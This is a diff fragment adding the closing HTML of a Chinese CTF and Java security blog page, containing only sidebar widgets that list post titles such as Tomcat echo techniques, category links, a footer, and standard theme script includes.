+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">这个ctfer好废物</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%87%A0%E7%A7%8D%E5%9B%9E%E6%98%BE"><span class="toc-text">Tomcat几种回显</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%9B%9E%E6%98%BE"><span class="toc-text">文件描述符回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ThreadLocal-Response%E5%9B%9E%E6%98%BE"><span class="toc-text">通过ThreadLocal Response回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8-Response%E5%9B%9E%E6%98%BE"><span class="toc-text">通过全局存储 Response回显</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">37</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/03/08/d%5E3CTF%20web%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> D^3CTF web部分wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/03/07/Spring-IOC/"><i class="fa  fa-book"></i> Spring IOC学习</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/03/06/TomcatEcho/"><i class="fa  fa-book"></i> Tomcat几种回显</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/03/01/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3java%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01-%E7%B1%BB%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"><i class="fa  fa-book"></i> 《深入理解java虚拟机》读书笔记1-类文件结构</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/02/22/jndi%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0class%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/"><i class="fa  fa-book"></i> jndi加载本地class绕过高版本限制</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
